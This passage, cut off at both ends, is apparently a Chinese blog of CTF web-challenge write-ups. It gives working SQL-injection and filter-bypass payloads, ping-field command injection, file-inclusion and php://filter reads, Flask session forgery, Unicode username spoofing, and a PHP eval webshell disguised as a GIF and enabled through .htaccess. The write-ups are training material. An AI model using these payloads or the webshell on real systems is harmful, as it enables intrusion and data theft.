emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">//这一坨代码，告诉我们，你输入的payload不为空，是字符串，且前面那个函数返回是ture，</span><br><span class="line">//才能给你include包含文件。这也是为什么我们file=后面要先接一个hint.php或者resource.php</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>从hint.php开始，..&#x2F;五个，读取文件</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191836788.png" alt="image-20230412191836788"></p><p>题外话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这和linux系统是一样的， </span><br><span class="line"></span><br><span class="line">. 表示当前目录</span><br><span class="line">.. 表示当前目录的上一级目录。</span><br><span class="line">./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定</span><br><span class="line">../表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">文件夹 a</span><br><span class="line">下面有  文件夹b c 和文件 d。</span><br><span class="line">文件夹b下面有e.php 和文件f。</span><br><span class="line"></span><br><span class="line">则e中的 . 表示 文件夹b</span><br><span class="line">./f 表示b下面的文件f。</span><br><span class="line">..  表示a文件夹。</span><br><span class="line">../d 表示a文件夹下的d文件。</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目提示包含漏洞</p><p>利用PHP封装协议：<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412192213420.png" alt="image-20230412192213420"></p><p>得到base64解码得到flag</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>常见管道符直接执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. | （按位或），直接执行|后面的语句</span><br><span class="line">2. || （逻辑或），如果||前面的语句是错误的，则执行后面的语句，否则的话只执行前面的语句</span><br><span class="line">3. &amp; （按位与），无论&amp;前后的语句真假，都要执行</span><br><span class="line">4. &amp;&amp; （逻辑与），若前面的语句为假，则后面的语句也不执行；若前面的语句为真则执行前后两条语句</span><br><span class="line">5. ; (作用和&amp;一样)</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193305228.png" alt="image-20230412193305228"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1和2都回显正常</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure><p>出现报错</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193723936.png" alt="image-20230412193723936"></p><p>说明字段有两位，尝试联合注入查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union seclet 1,2#</span><br></pre></td></tr></table></figure><p>不行，过滤了<strong>select|update|delete|drop|insert|where|.&#x2F;i</strong></p><p>我们尝试堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases; #</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194247241.png" alt="image-20230412194247241"></p><p>爆表名<strong>1’; show tables;#</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194440570.png" alt="image-20230412194440570"></p><p>查表的字段<strong>1’;show columns from words;#</strong></p><p><strong>1’; show columns from <code>1919810931114514</code>;#</strong><br><strong>注意：表名为数字时，要用&#96;包起来查询。</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194738125.png" alt="image-20230412194738125"></p><p>flag 找到了，该怎么查看数据呢</p><p>方法一：改名换姓</p><p>我们可以“改名换姓”把1919810931114514表名改成words表，仅如此还不够，由于words表有两个字段，我们需要把新的words表也变成两个字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table &#x27;1919810931114514&#x27; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p>方法二：关键字编码绕过</p><p>select被过滤了，那么我们可以绕过这个过滤（16进制编码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x&lt;这里填查询语句的十六进制代码&gt;;prepare execsql from @a;execute execsql;#</span><br><span class="line">也就是：</span><br><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure><p>方法三：关键字过滤之等价函数替换</p><p>查询语句除了我们常用的“SELECT”语句以外还有HANDLER。并且在官方的说明中“HANDLER查询性能比SELECT更好”所以我们可以直接换个查询函数赛。（我不李姐）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as flag; handler flag read next;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195335176.png" alt="image-20230412195335176"></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>题目提示ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195655093.png" alt="image-20230412195655093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195808644.png" alt="image-20230412195808644"></p><p>提示过滤了空格（f*uk）</p><p>空格绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125;替换</span><br><span class="line">$IFS$1替换</span><br><span class="line">$&#123;IFS替换</span><br><span class="line">%20替换</span><br><span class="line">&lt;和&lt;&gt;重定向符替换</span><br><span class="line">%09替换</span><br></pre></td></tr></table></figure><p>查看一下源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200159641.png" alt="image-20230412200159641"></p><p>这里 匹配一个字符串中，是否按顺序出现过flag四个字母。所以不能有flag。那我们进行绕过</p><p>变量绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>然后查看网页源代码得到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200708343.png" alt="image-20230412200708343"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>打开题目，查看源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419201617706.png" alt="image-20230419201617706"></p><p>提示我不是admin</p><p>尝试注册admin,提示已被注册</p><p>先随便注册一个账号进去看看，</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419201848848.png" alt="image-20230419201848848"></p><p>在<strong>修改密码页面</strong>，查看源代码，发现github上的源码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419202007017.png" alt="image-20230419202007017"></p><p>可惜404了</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419202037199.png" alt="image-20230419202037199"></p><p>找别人博客看吧</p><p>姿势一：弱口令爆破一波,因为是个弱口令(123),爆破也能爆破出来，<strong>admin,123</strong>得到flag</p><p>弱口令不行的话就试试<strong>sql注入</strong>,抓包看看，有一个session</p><p>姿势二：</p><p>session伪造（flask）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session 和 Cookie 功能效果是差不多的，区别就是session 是记录在服务端的，Cookie是记录在客户端的</span><br><span class="line">但flask的session保存在客户端，我们需要找到密钥来对session进行解码来获取其中的用户数据</span><br></pre></td></tr></table></figure><p>找到session</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419203729050.png" alt="image-20230419203729050"></p><p>再找一个来处理session的脚本</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>简单用法：</p><p>decode -c “session”</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419203908894.png" alt="image-20230419203908894"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;_fresh&quot;:true,&quot;_id&quot;:&#123;&quot; b&quot;:&quot;YjEwZjBiZmQ4Mjg3MjE5M2MyYjFjNTU4MDQ1ZWQyM2UyOTk2NTdkOGVmMmRiMDM1MGVlMmQwNzA4Y2Y5YTI2MjI5ZTAzOWQyZDU4MDVhMDIzN2I1Nzg2ZTQ3OWZiMWRlNTAzYjE4YmU3NzMyM2VlMmI3Y2RiM2Q1ZGEwOGIwN2Y=&quot;&#125;,&quot;csrf_token&quot;:&#123;&quot; b&quot;:&quot;MDhmM2VhZmMxY2RhZDNhNGQzZGE5ZTJlNzk2ODIwODcxYmU1M2YwYg==&quot;&#125;,&quot;image&quot;:&#123;&quot; b&quot;:&quot;NW94Sw==&quot;&#125;,&quot;name&quot;:&quot;1&quot;,&quot;user_id&quot;:&quot;10&quot;&#125;</span><br></pre></td></tr></table></figure><p>将用户名name改为admin</p><p>加密时一直报错</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204301393.png" alt="image-20230419204301393"></p><p>找了一个decode脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from base64 import b64decode</span><br><span class="line">from flask.sessions import session_json_serializer</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">def decryption(payload):</span><br><span class="line">    payload, sig = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    payload, timestamp = payload.rsplit(b&#x27;.&#x27;, 1)</span><br><span class="line">    decompress = False</span><br><span class="line">    if payload.startswith(b&#x27;.&#x27;):</span><br><span class="line">        payload = payload[1:]</span><br><span class="line">        decompress = True</span><br><span class="line">    try:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        raise Exception(&#x27;Could not base64 decode the payload because of &#x27;</span><br><span class="line">                         &#x27;an exception&#x27;)</span><br><span class="line">    if decompress:</span><br><span class="line">        try:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            raise Exception(&#x27;Could not zlib decompress the payload before &#x27;</span><br><span class="line">                             &#x27;decoding the payload&#x27;)</span><br><span class="line">    return session_json_serializer.loads(payload)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    print(decryption(sys.argv[1].encode()))</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204440482.png" alt="image-20230419204440482"></p><p>发现这个用的是单引号那个是双引号<br> 同时这个把base64直接解码了</p><p>再进行encode</p><p>用法：encode -s “钥匙” -t “明文”</p><p>钥匙在源码找到的</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204726351.png" alt="image-20230419204726351"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204645536.png" alt="image-20230419204645536"></p><p>修改session的值，刷新就行</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419204835926.png" alt="image-20230419204835926"></p><p>姿势三：Unicode欺骗</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419205242000.png" alt="image-20230419205242000"></p><p>发现注册和登录以及修改密码处只是对数据进行了<strong>strlower()函数</strong>小写化，在末尾查看函数</p><p><strong>strlower()函数</strong>的作用是小写化name</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230419205333918.png" alt="image-20230419205333918"></p><p><strong>nodeprep.prepare</strong>这个方法是将大写字母转换成小写字母，但是它存在一个问题：它会将unicode编码的ᴬ转化成A，而A在调用一次nodeprep.prepare函数会把A转换成a</p><p>这个字符可以在后面网站找到，<a href="https://unicode-table.com/en/1D2E/">https://unicode-table.com/en/1D2E/</a></p><p>1.如果用ᴬᴰᴹᴵᴺ注册，注册经过处理，储存在数据库就变成了 ADMIN</p><p>2.登录后，加密储存在session 的也是ADMIN</p><p>3.修改密码后，取出session进行解密name也是ADMIN</p><p>4.再调用一次strlower函数就变成了admin</p><p>5.这时admin 的密码就变成了自定义修改后的密码。登录后就得到 flag 。</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>先上传一句话木马。并且将下面的内容保存成文件2.png</p><p>内容：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a? </span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hack&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>直接上传成功了<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420141955359.png" alt="image-20230420141955359"></p><p>用蚁剑还是连不上</p><p><strong>.htaccess是什么</strong></p><p>启用.htaccess需要修改httpd.conf（Apache里的）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</span><br></pre></td></tr></table></figure><p>写一个.htaccess文件，将其他类型的文件转化成php文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch &quot;2.png&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>接着我们再上传.htaccess文件，抓包，Content-Type更改成image&#x2F;png</p><p>蚁剑连接2.png即可 路径：&#x2F;upload&#x2F;94e1b5d8a172dee319d653594cff56e6&#x2F;2.png</p><p>根目录找到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143227755.png" alt="image-20230420143227755"></p><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>有三个文件</p><p>&#x2F;flag.txt</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143534518.png" alt="image-20230420143534518"></p><p>&#x2F;welcome.txt</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143547654.png" alt="image-20230420143547654"></p><p>&#x2F;hints.txt</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420143640993.png" alt="image-20230420143640993"></p><p>提示flag在&#x2F;fllllllllllllag里，filehash&#x3D;md5(cookie_secret+md5(&#x2F;fllllllllllllag))</p><p>根据题目easy_tornado可推测是服务器模板注入</p><p>需要找到cookie_serect</p><p>注入查看配置文件，得到cookie_secert</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420144517901.png" alt="image-20230420144517901"></p><p>接着进行MD5加密</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=/fllllllllllllag&amp;filehash=90464389fd908f5db3eb64d0f42e2048</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420144930047.png" alt="image-20230420144930047"></p><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>输入1，回显：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Array ( [0] =&gt; 1 ) </span><br></pre></td></tr></table></figure><p>输入1‘ and1&#x3D;1啥的回显Nonono</p><p>大佬直接猜出源码是：select $_POST[‘query’] || flag from Flag</p><p>当输入*,1时，此时语句为：select *,1 from Flag，1是新增一列，</p><p>*是所有。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420145818503.png" alt="image-20230420145818503"></p><p>另一种姿势：</p><p>先查看数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show databases;#</span><br></pre></td></tr></table></figure><p>查看表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;show tables;#</span><br></pre></td></tr></table></figure><p> 查看字段值，这里出问题了。过滤了好多东西</p><p>看别人的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1;set sql_mode=PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure><p>set sql_mode&#x3D;PIPES_AS_CONCAT;的作用是将||的功能从 或运算（or） 改为 字符串拼接，修改之后这个 || 相当于是将select 1 和 select flag from Flag 的结果拼接在一起。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150432516.png" alt="image-20230420150432516"></p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>打开，找到信息</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150549216.png" alt="image-20230420150549216"></p><p>看到</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150637831.png" alt="image-20230420150637831"></p><p>点一下这个，很快闪过去了</p><p>我们抓包仔细看看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420150851373.png" alt="image-20230420150851373"></p><p>访问它</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment">//报错回显</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="comment">//strstr函数搜索在另一字符串的第一次出现</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用filter协议读取flag.php，base64解密</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420151709003.png" alt="image-20230420151709003"></p><h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p>万能密码能进</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1#</span></span><br></pre></td></tr></table></figure><p>但不是flag</p><p>先查一下字段</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; order by 3# //无报错</span></span><br><span class="line"><span class="string">admin&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span># <span class="operator">/</span><span class="operator">/</span>有报错</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152713873.png" alt="image-20230420152713873"></p><p>联合查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union select 1,2,3#</span><br></pre></td></tr></table></figure><p>回显在2，3上</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152917362.png" alt="image-20230420152917362"></p><p>看数据库</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union select 1,database(),3#</span></span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420152953584.png" alt="image-20230420152953584"></p><p>看表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;geek&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153129832.png" alt="image-20230420153129832"></p><p>看字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">group_concat(column_name) from information_schema.columns where table_schema=&#x27;geek&#x27; and table_name=&#x27;l0ve1ysq1&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153259465.png" alt="image-20230420153259465"></p><p>看数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">group_concat(id,username,password) <span class="keyword">from</span> l0ve1ysq1</span><br></pre></td></tr></table></figure><p>有flag，geekuser没有flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420153428473.png" alt="image-20230420153428473"></p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="极客大挑战 2019]Http"></a>极客大挑战 2019]Http</h2><p>打开，发现信息</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420154629357.png" alt="image-20230420154629357"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span><br><span class="line">Please use &quot;Syclover&quot; browser</span><br><span class="line">No!!! you can only read this locally!!!</span><br></pre></td></tr></table></figure><p>http头：referer:<a href="https://sycsecret.buuoj.cn/">https://Sycsecret.buuoj.cn</a></p><p>User-Agent: Syclover</p><p>X-Forwarded-For:127.0.0.1</p><p>flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155202935.png" alt="image-20230420155202935"></p><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><p>命令查看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155510702.png" alt="image-20230420155510702"></p><p>再查看源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155715714.png" alt="image-20230420155715714"></p><p>蚁剑查看，在根目录看到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155620238.png" alt="image-20230420155620238"></p><h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><p>上传2.png，</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155902462.png" alt="image-20230420155902462"></p><p>更改后缀，发现2.phtml可以上传</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420155955895.png" alt="image-20230420155955895"></p><p>上传路径应该是&#x2F;upload&#x2F;2.phtml</p><p>读取flag<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160227332.png" alt="image-20230420160227332"></p><p>蚁剑连接，根目录找到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160354641.png" alt="image-20230420160354641"></p><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传2.png，回显上传成功，抓包看看去</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160551695.png" alt="image-20230420160551695"></p><p>将后缀改为phtml成功上传</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160713757.png" alt="image-20230420160713757"></p><p>查看flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420160950257.png" alt="image-20230420160950257"></p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>尝试万能密码 1‘ or 1&#x3D;1#</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420161222526.png" alt="image-20230420161222526"></p><p>报错了，or没了，or应该被过滤了</p><p>绕过方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">双写绕过，大小写绕过，||代替</span><br></pre></td></tr></table></figure><p>1’ || 1&#x3D;1#  成功进入</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420161503565.png" alt="image-20230420161503565"></p><p>查字段数</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; oorrder bbyy 3 # //无报错</span></span><br><span class="line"><span class="string">admin&#x27;</span> oorrder bbyy <span class="number">4</span> <span class="comment"># //报错了</span></span><br></pre></td></tr></table></figure><p>联合查询吧</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ununionion selselectect 1,2,3 #</span></span><br></pre></td></tr></table></figure><p>看数据库</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,database(),3 #</span><br></pre></td></tr></table></figure><p>看表名</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ununionion seselectlect 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;</span>geek<span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162538553.png" alt="image-20230420162538553"></p><p>看字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162737699.png" alt="image-20230420162737699"></p><p>看数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,database(),group_concat(id,username,passwoorrd) frfromom  b4bsql#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420162823139.png" alt="image-20230420162823139"></p><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>他说他有一个备份的好习惯，看看<a href="http://www.zip和www.rar等/">www.zip和www.rar等</a></p><p><a href="http://www.zip有东西/">www.zip有东西</a></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420163114051.png" alt="image-20230420163114051"></p><p>查看了class.php，index.php</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230420163856548.png" alt="image-20230420163856548"></p><p>有一个Name类，里面有两个私有属性，username，password，</p><p>我们需要将username&#x3D;admin，password&#x3D;100，序列化一下get方式提交</p><p>常用的内置方法：<br> __ construct()：创建对象时初始化，当一个对象创建时被调用<br> __ wakeup() 使用unserialize时触发<br> __ sleep() 使用serialize时触发<br> __ destruction()：结束时销毁对象，当一个对象销毁时被调用</p><p>看<a href="http://t.csdn.cn/dXSFs">php反序列化</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span 